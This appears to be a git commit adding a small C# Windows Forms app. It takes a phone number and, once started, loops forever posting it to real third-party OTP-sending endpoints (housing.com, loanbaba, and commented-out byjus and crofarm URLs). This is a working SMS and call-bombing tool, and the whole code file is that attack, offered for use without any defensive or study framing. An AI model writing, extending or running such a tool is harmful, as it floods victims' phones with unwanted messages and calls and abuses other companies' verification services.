baba86e97b3bba41dc125315e79f20952adf6200
404abhishek <133399764+404abhishek@users.noreply.github.com>
2023-06-02 11:09:06 -0700

    Add project files.

---
+++ WindowsFormsApp1/Spacialkaam.Designer.cs
@@ -0,0 +1,75 @@
+﻿namespace WindowsFormsApp1
+{
+    partial class Spacialkaam
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.btnsend = new System.Windows.Forms.Button();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.SuspendLayout();
+            // 
+            // btnsend
+            // 
+            this.btnsend.BackColor = System.Drawing.Color.CornflowerBlue;
+            this.btnsend.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnsend.Location = new System.Drawing.Point(270, 115);
+            this.btnsend.Name = "btnsend";
+            this.btnsend.Size = new System.Drawing.Size(93, 40);
+            this.btnsend.TabIndex = 0;
+            this.btnsend.Text = "GO!";
+            this.btnsend.UseVisualStyleBackColor = false;
+            this.btnsend.Click += new System.EventHandler(this.Btnsend_Click);
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(251, 89);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(141, 20);
+            this.textBox1.TabIndex = 1;
+            // 
+            // Spacialkaam
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = global::WindowsFormsApp1.Properties.Resources.images;
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.ClientSize = new System.Drawing.Size(404, 218);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.btnsend);
+            this.Name = "Spacialkaam";
+            this.Text = "Spacialkaam";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button btnsend;
+        private System.Windows.Forms.TextBox textBox1;
+    }
+}
---
+++ WindowsFormsApp1/Spacialkaam.cs
@@ -0,0 +1,87 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Net.Http;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace WindowsFormsApp1
+{
+    public partial class Spacialkaam : Form
+    {
+        int i=0;
+        public Spacialkaam()
+        {
+            InitializeComponent();
+        }
+
+        private void Label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void Btnsend_Click(object sender, EventArgs e)
+        {
+            i = 1;
+             postAsync();
+        }
+        private async Task postAsync()
+        {
+            while(i==1)
+            {
+                string num = textBox1.Text;
+                HttpClient client = new HttpClient();
+                var values = new Dictionary<string, string>
+                {
+                    { "phone", num },
+               { "POST", "Sent" }
+                };
+                var content = new FormUrlEncodedContent(values);
+                var response = await client.PostAsync(
+                       "https://login.housing.com/api/v2/send-otp", content);
+                var result = await response.Content.ReadAsStringAsync();
+
+                //values = new Dictionary<string, string>
+                //{
+                //   { "phoneNumber", num },
+                //   { "page", "free-trial-classes" },
+                //     { "POST", "" },
+                //      { "isOtpExhausted", "false" }
+                //};
+                // content = new FormUrlEncodedContent(values);
+                // response = await client.PostAsync(
+                //       "https://mtnucleus.byjusweb.com/api/acs/v2/send-otp", content);
+                // result = await response.Content.ReadAsStringAsync();
+
+                //values = new Dictionary<string, string>
+                //{
+                //   { "type", "mobile" },
+                //   { "phone", num },
+                //     { "is_voice_otp", "+91" },
+                //     { "POST", "" },
+                //       { "success", "true" }
+                //};
+                //content = new FormUrlEncodedContent(values);
+                //response = await client.PostAsync(
+                //      "https://api.crofarm.com/cons/consumer/otp/v1/", content);
+                //result = await response.Content.ReadAsStringAsync();
+
+                values = new Dictionary<string, string>
+            {
+               { "phoneNo", num},
+               { "Content-Type", "application/json" },
+                 { "POST", "200" }
+                
+            };
+                content = new FormUrlEncodedContent(values);
+                response = await client.PostAsync(
+                      "https://www.loanbaba.com/sdgpeknj/MAppService.asmx/SendOTPonCall", content);
+                result = await response.Content.ReadAsStringAsync();
+            }
+        }
+    }
+}
